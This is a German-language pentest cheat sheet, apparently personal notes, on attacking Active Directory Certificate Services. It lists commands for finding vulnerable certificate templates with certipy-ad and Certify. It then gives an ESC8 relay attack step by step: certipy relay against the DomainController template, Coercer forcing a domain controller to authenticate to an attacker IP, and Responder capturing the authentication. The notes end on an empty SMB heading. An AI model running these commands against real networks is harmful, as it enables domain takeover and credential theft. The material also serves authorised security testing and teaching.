
## ADCS - Active Directory Certificate Service

### Zertifikate anfragen - Linux

Mit `certipy-ad` ist es möglich Zertifikate zu dumpen.
Dazu muss die Domänen Controller IP ausfindig gemacht werden. Falls man sich in einem internen Netz befindet, stehen die Chancen hoch, dass diese per DNS übermittelt wurden. Dazu kann man einfach in der `/etc/resolv.conf` nachschauen.

Mit der DCIP können dann die Zertifikate angefragt werden.

```bash
certipy-ad find -u USER -p PASSWORD -dc-ip DCIP -text
```

Falls bei der Ausführung ein Fehler geworfen wird, sollte trotzdem ein Output File erstellt worden sein, in dem die Zertifikate gelistet sind.(Stand 2024-07-30)

Das Output File kann im Anschluss mit `grep -i Vuln -A1 FILE` nach verwundbaren Zertifikaten durchsucht werden.

### Zertifikate anfragen - Windows

Mit `certify` können unter Windows Zertifikate ausgelesen werden. Entsprechende Binaries gibt es im [Ghostpack-CompiledBinaries Repo](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

Die Binary muss als Domänen Benutzer ausgeführt werden. Dazu einfach eine CMD oder Powershell Session als Domänen starten und `certify` ausführen.

```powershell
runas /user:DOMAIN\USER /netonly powershell
```

Im neuen Konsolen Fenster wird dann certify ausgeführt.

```powershell
certify.exe find /vulnerable /currentuser
```

### ESC-8

Um die Authentifizierung an die CA umzuleiten kann das `certipy relay` Modul verwendet werden.

```bash
certipy relay -template DomainController -ca CA-NAME -target CA-DNS-NAME (-upn ALTERNATIVENUPN)
```

Daraufhin erzwingen wir eine Domain Controller anmeldung gegen ein geeignetes Ziel.
- [ ] ESC-8 Coercing wen gegen wen authentifizieren ➕ 2024-07-30

```bash
coercer coerce -v -u USER -d DOMAIN -l ATTACKERIP -t TARGETIP
```

Um Authentifizierungsabfragen anzunehmen muss noch `responder` gestartet werden.

```bash
sudo responder -A -I INTERFACE-TO-LISTEN-ON
```

## SMB
